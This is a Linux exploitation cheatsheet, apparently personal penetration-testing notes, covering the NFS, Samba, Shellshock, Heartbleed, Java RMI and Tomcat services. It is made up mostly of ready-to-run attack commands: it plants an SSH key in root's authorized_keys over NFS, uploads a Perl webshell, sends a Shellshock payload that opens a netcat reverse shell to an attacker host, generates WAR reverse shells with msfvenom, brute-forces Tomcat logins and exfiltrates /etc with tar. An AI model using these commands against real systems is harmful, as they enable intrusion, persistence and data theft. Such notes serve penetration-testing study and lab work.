# 4 - Linux Exploitation

## <mark style="color:green;">Enumeration</mark>

Linux enumeration cheatsheet

{% file src=".gitbook/assets/Post Exploitation CommandsCheatsheet (1).pdf" %}
important linux cmds
{% endfile %}

## <mark style="color:green;">Exploitation</mark>

`nmap -O --osscan-guess 192.168.0.178` - tries to guess the OS (aggressive detection).

Having scanned with nmap and identified ports we can start with targeting "Low-Hanging Fruits" i,e ports like <mark style="color:orange;">**"rpcbind (111)"**</mark>  and <mark style="color:orange;">**"nfs (2049)"**</mark> .

### <mark style="color:red;">NFS (2049)</mark>

The NFS (Network File System) is an RPC-based file sharing protocol often found configured on Unix-like systems, is typically used to provide access to shared resources and can be found listening on TCP/UDP port 2049.&#x20;

`nmap -sT -sU -sV -p2049 192.168.0.178` - open NFS ports .&#x20;

`nmap --script nfs-ls,nfs-showmount,nfs-statfs 192.168.0.178` - check if there are any NFS Exports directories.

or&#x20;

`showmount -e 192.168.0.178` - same as above nmap cmd.

> Note: if you see something like this; Export list for 192.168.0.178: /var/www 192.168.0.100 # could be any directory. /home/bob 192.168.0.100 # could be any directory. This means the ip addr 192.168.0.100 is whitelisted to access the NFS exports dir, we can spoof our ip to that ip to access the share.

#### NFS exploitation

* `mkdir /mnt/root` - create a temporary mont point on kali.
* `mount -t nfs 192.168.0.178:/ /mnt/root -o nolock` - mount the exported NFS share there.
* `mount` - check if it was successfully mounted.
* `cd /mnt/root && ls -al` - cd into the dir and list its contents.
* `cat /mnt/root/home/*/.ssh/id` - we can also find all ssh keys and if we get a private key we can ssh into the victim without password by copying the private key and using it to login ie, `ssh -i id_rsa <user>@ip` . Article:  [https://jamespatricksec.medium.com/enumerating-and-exploiting-nfs-1571cb484e16](https://jamespatricksec.medium.com/enumerating-and-exploiting-nfs-1571cb484e16)&#x20;

or

Since we have write premission to the NFS export share ".ssh" folder, we can replace the existing authorized\_keys file on the share with a new file that has our public key in it and try to login as root.

* `ssh-keygen -t rsa` - generate a pub-priv key pair on kali.
* `cat id_rsa.pub >> authorized_keys` - create a file named "authorized\_keys" then copy our created id\_rsa.pub key to it.
* `sudo cp authorized_keys /mnt/root/.ssh` - copy the authorized key file to the NFS share.
* `ssh -i id_rsa root@192.168.0.178` - login with the private key pair.
* `umount -f -l /mnt/<path>` - to unmount the share.

### <mark style="color:red;">RPCbind (111)</mark>

`nmap --script rpc-grind,rpcinfo 192.168.0.178 -p111` - enumerate the RPC portmapper.

### <mark style="color:red;">Samba (135,137,138,139,445)</mark>

`sudo nmap -sT -sU 192.168.0.178 -p135,137,138,139,445 --open` - scan for Samba netbios ports.&#x20;

`nmap --script smb-enum-shares 192.168.0.178` - enumerate Samba shares.&#x20;

or

`smbclient -L 192.168.0.178` - enumerate open shares.&#x20;

`smbmap -H 192.168.0.178` - outputs shares permissions.&#x20;

`smbclient \\\\192.168.0.178\\tmp` - accessing the shares we have access to.&#x20;

We could also mount the shares we can access.&#x20;

`mkdir /mtn/share` - create the temp share dir.&#x20;

`mount -t cifs \\\\192.168.0.178\\tmp /mnt/share` - now we can access it like a normal dir.

#### Samba Users enumeration

There are 2 methods we can use to enumerate users:

* rcclient bruteforce.
* enum4linux

1. **rpcclient bruteforce:** we can use the below bash script and also create a "users.txt" with list of usernames to check with.

```bash
#!/bin/bash

for u in $(cat users.txt); do
    rpcclient -U "" 192.168.0.178 -N \
    -c "lookupnames $u" | grep "User: 1"
done
```

2. **enum4linux**

### <mark style="color:red;">Samba Symlink Directory Traversal Vulnerability</mark>

This vulnerability allows an attacker to create a symbolic link to the root (/) partition from a wwritable share ultimately allowing read access to the entire file system outside of the share directory. We can use Metasploit for this.

we can confirm we have a writable share using smbmap&#x20;

`smbmap -H 192.168.0.178` - view all available writable shares.

{% code overflow="wrap" lineNumbers="true" %}
```bash
search samba_symlink
use 0
set RHOST
set SMBSHARE tmp
set SMBTARGET rootfs
run
```
{% endcode %}

* Next step is to use "smbclient" to access the share&#x20;
* `smbclient \\\\192.168.0.178\\tmp` - access the share, you can use "get" and "put" to download and upload files.&#x20;
* Another usefull cmd for data exfilteration when conducting post-exploitation tasks using "smbclient" is the "tar" cmd.&#x20;
* `tar c /tmp/etc_files.tar *` - tar the etc folder and save on our kali.

### <mark style="color:red;">Samba Remote Code Execution with Perl</mark>

In situations where we have a patched Samba server running with a writable share available to us, we can exploit that scenerio for RCE. Example; a share named "www" and port 80 open could be used to update web contents by admin.&#x20;

We connect to the share using smbclient, we find a "index.pl" file which indicates the server is likely configured to process Perl CGI programs. We donwload (get) and inspect the file. We can also type in our browser: `192.168.0.178/index.pl` - and it is executed successfully. We've confirmed that the "www" share onthe Samba server is most likely used to server the "index.pl" script and is the actual web root for the web server.

We will be using the imbuilt perl webshell reverse shell in kali, "/usr/share/webshells/perl/ . We will do some modifications before using it. Modify the ip and port options we are going to be using for a netcat listener to accept the connection. After that, upload it back to the share. Setup "nc" listener,&#x20;

`nc -nvlp 1234` . Now access the perl script page from the browser and Boom! we get a shell.



### <mark style="color:red;">SMTP (25)</mark>

`nmap --script smtp-commands 192.168.0.178 -p 25` - enumerate enabled verbs/features eg VRFY, ETRN etc..

### Linux Post Exploitation (enumeration) cheatsheet

#### Network Information enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ifconfig -a
route -n
traceroute -n <ip_addr> # know how many hops are btw our compromised machine and other network segments.
cat /etc/resolv.conf # what machine is resolving our DNS requests? can we use it to exfilterate data over a DNS tunnel? is the DNS server vulnerable to any exploit?
arp -en # other host in the network.
netstat -auntp # what other machine are we connected to? which ports or services are we connected to or listening on?
ss -twurp # list active connections, processes, users and bytes.
nmap -sT =555 <domain_name> # check outbound firewall rules.
```
{% endcode %}

<details>

<summary>System Information enumeration</summary>

![1](<.gitbook/assets/image (34).png>)

![](<.gitbook/assets/image (9).png>)

![](<.gitbook/assets/image (4).png>)

![](<.gitbook/assets/image (8).png>)

![](<.gitbook/assets/image (10).png>)



We can use automated tools for this:

* LimEnum
* LinuxPrivChecker
* Unix-privesc-check
* mimipenguin # for dumping logon password of users.





</details>

### <mark style="color:red;">Shellshock</mark>

The vuln was discovered in the UNix Bash Shell, and affected CGI programs on web servers, OpenSSH, DHCP clients, Qmail mail servers etc. `env x=`() { :;}; echo vulnerable `bash -c "echo this is a test"` check if a PC is vulnerable.

#### Exploitation

* We have to search for CGI programs on a web server.&#x20;
* `./dirsearch.py -u http://ip/ -e cgi -r` - search for CGI programs, we can use dirb, gobuster, ffuf etc.&#x20;
* `nmap --script http-shellshock --script-args uri=/<path_to_cgi> 192.168.0.100 -p 80` - check if the cgi file is vulnerable to shellshock.&#x20;
* `wget -U "() {foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.0.100/<cgi_path> && cat login.cgi` - this will run the cat /etc/passwd.
* To get RCE, we setup nc listener, `nc -nvlp 1234` . `wget -U "() {foo;};echo; /bin/nc 192.168.0.50 1234 -e /bin/sh" http://192.168.0.100/<cgi-path>` - we should get a reverse shell.

### <mark style="color:red;">Heartbleed</mark>

Heartbleed surfaced 2014, was a critical bug affecting OpenSSL versions 1.0.1 - 1.0.1f and allowed for the reading of encrypted data stored in memory due to a faulty implementation of the TLS and DTLS protocols.&#x20;

`nmap --script ssl-heartbleed 192.168.0.178` - check if a victim is vulnerable. After that, we can use Metasploit to dump encrypted memory contents.

{% code overflow="wrap" lineNumbers="true" %}
```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS
show actions # view all the auxiliary actions, lets select #1.
set action DUMP
run # check the loot file.
```
{% endcode %}

* We can run the "strings" cmd against the .bin file to see if we were able to leak anything. `strings 202345445_default_192.168.0.100_openssl.heartbleed.bin` - output all the strings from the file.

### <mark style="color:red;">Java RMI Registry (1099)</mark>

`nmap -sT <ip> -p1099 -sV` - check for GNU Classpath Registry fingerprint. We can us the metasploit module to exploit it.

{% code overflow="wrap" lineNumbers="true" %}
```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS
set SRVPORT # if you are running another service on 8080.
set SSL true # for AV/IDS evasion, not necessary.
run -j # we get a shell.
```
{% endcode %}

### <mark style="color:red;">Java Deserialization</mark>

Jsva Deserialization vulns apperar to exist in many various java based apps eg; Jboss, WebLogic, WebSphere and Jenkins etc.

* Serialization: is a process which allows for apps to convert data into a binary format, which is suitable for saving to disk.

### <mark style="color:red;">Apache Tomcat (8180)</mark>

A widely used, free and open source FOSS web server primarily for Java-based web apps. The Tomcat Manager is an area of the web app that allows admins to view settings for internal Tomcat configs. We can use Metasploit to bruteforce the logins.

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
msf> set RHOSTS, RPORT
msf> run
```
{% endcode %}

We're specifically interested in the "jsp" files. There are imbuilt java apps in kali,&#x20;

just do `locate jsp` and you should get the location under "/usr/share/laudanum/jsp". We can use the already precompiled "war.cmd" java app there. lets upload into the "http://192.168.0.178:8180/manager/html" dir through the browser.&#x20;

Once we click the deploy button and confirm the app is available in the upper section of the manager interface. Now we navigate to load the app, `http://192.168.0.178:8180/cmd/cmd.jsp` - and we can execute cmds on the browser.

**From here, there are many ways we can get reverse shell from the JSP Shell interface:**

Using msfvenom&#x20;

`msfvenom --list payloads| grep jsp` - view the available payloads for JSP files.&#x20;

`msfvenom -p java/jsp_shell_reverse_tcp --list-options` - check what settings need to be specified for the payloads.&#x20;

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.100 LPORT=5555 -f war > shell.war` - JSP war Reverse Shell.&#x20;

`msfvenom -p java/jsp_shell_bind_tcp RHOST=0.0.0.0 LPORT=3155 -f war > bind.war` - JSP war Bind Shell.&#x20;

`nc -nvlp 5555` - netcat listener.&#x20;

Upload the "shell.war" to the browser, then click it to load it.&#x20;

`python -c 'import pty; pty.spawn("/bin/bash")'` - or use (/bin/sh) use this to get an [interactive shell.](http://127.0.0.1:5000/s/WPOLwOSWXgLskpcvgoOj/tips-and-tricks/spawning-shells) then you can use socat to get a more SSH-like shell.

## <mark style="color:green;">Post Exploitation</mark>















